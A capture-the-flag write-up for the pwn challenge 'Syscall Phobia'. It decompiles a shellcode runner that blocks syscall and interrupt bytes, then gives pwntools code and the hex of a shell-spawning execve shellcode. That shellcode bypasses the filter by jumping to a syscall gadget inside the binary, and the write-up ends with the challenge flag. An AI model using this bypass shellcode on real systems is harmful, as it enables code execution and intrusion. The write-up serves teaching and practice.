# Syscall Phobia

> 150 | Pwn
> 
> Timmy has created a program to execute any x86_64 bytecode instructions! However, Timmy has an absolute detest for syscalls, and does not want anyone to insert syscalls into their instructions. This will make it a little secure... right?
> 
> This challenge server can be accessed here:
> 
> (Any one of the options below is fine)  
> (Suggested access via 'nc')  
> nc ctf-85ib.balancedcompo.site 9998  
> _(9 more nc endpoints)_ 
> 
> Files (Any of the links are fine):  
> https://nusdsoctf2.s3-ap-southeast-1.amazonaws.com/S3/Syscall_Phobia/syscall-phobia  
> https://nusdsoctf.s3-ap-southeast-1.amazonaws.com/S3/Syscall_Phobia/syscall-phobia  
> [Attachment: syscall-phobia](./challenge/syscall-phobia)

Writeup by [@4yn](https://github.com/4yn)

Try to run the executable:

```
$ ./challenge/syscall-phobia
Enter your hexadecimal bytecode here and we will execute it for you!
We absolutely hate syscalls so please DO NOT enter syscall instructions here :D
Example: 554889e5c9c3

Enter assembly bytecode here! (No syscalls please, tenks): 
[I press enter without keying in any shellcode]

Executing your assembly code!
Segmentation fault (core dumped)
```

Decompile with ghidra:

```c++
undefined8 FUN_00400a2c(void)

{
  size_t sVar1;
  void *pvVar2;
  char local_118 [260];
  int local_14;
  code *local_10;
  
  local_10 = (code *)mmap((void *)0x0,0x1000,7,0x22,-1,0);
  puts("Enter your hexadecimal bytecode here and we will execute it for you!");
  puts("We absolutely hate syscalls so please DO NOT enter syscall instructions here :D");
  puts("Example: 554889e5c9c3\n");
  puts("Enter assembly bytecode here! (No syscalls please, tenks): ");
  fflush(stdout);
  fgets(local_118,200,stdin); // Get up to 
  sVar1 = strcspn(local_118,"\n");
  local_118[sVar1] = '\0';
  local_14 = FUN_004008f6(local_118,local_10,local_10); // Converts hex string input to raw byte array
  pvVar2 = memmem(local_10,(long)local_14,&DAT_00400d5e,2); // DAT_00400d5e is text pointer to 0x0f05
  if (pvVar2 == (void *)0x0) { // Check if shellcode contains syscall
    pvVar2 = memmem(local_10,(long)local_14,&DAT_00400d61,2); // DAT_00400d61 is text pointer to 0xcd80
    if (pvVar2 == (void *)0x0) { // Check if shellcode contains interrupt
      puts("Executing your assembly code!");
      fflush(stdout);
      DAT_006020a0 = local_10;
      (*local_10)(); // Run shellcode
      return 0;
    }
  }
  puts("Hey! I told you no syscalls! :(");
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

We want to make a shellcode that pops a shell, but any instance of `0f05` / syscall or `cd80` / interrupt instructions will prevent execution.

A quick checksec shows that the elf does not have PIE enabled.

```python
from pwn import *
e = ELF('./challenge/syscall-phobia')
e.checksec()
"""
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
"""
```

To solve this, instead of having a syscall instruction in the shellcode, we ROP to a syscall instruction somewhere else inside the binary.

```python
r = ROP(e)
assembly = shellcraft.sh()
assembly = assembly.replace("syscall", f"push {hex(r.syscall.address)}\n    ret")
print(assembly)
"""
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push b'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    push 0x400d5e
    ret
"""

shellcode = asm(assembly)
print(shellcode.hex())
"""
6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b58685e0d4000c3
"""
```

Once in the server, just cat the flag. Note that the server's `$PATH` was polluted and we need to use the full path to `cat`.

```bash
$ /bin/cat flag.txt
DSO-NUS{a5a5ab1dc69bb9ffb55e75bdc290313d7d7137e653c98e66cc23dc042b2046bc}
```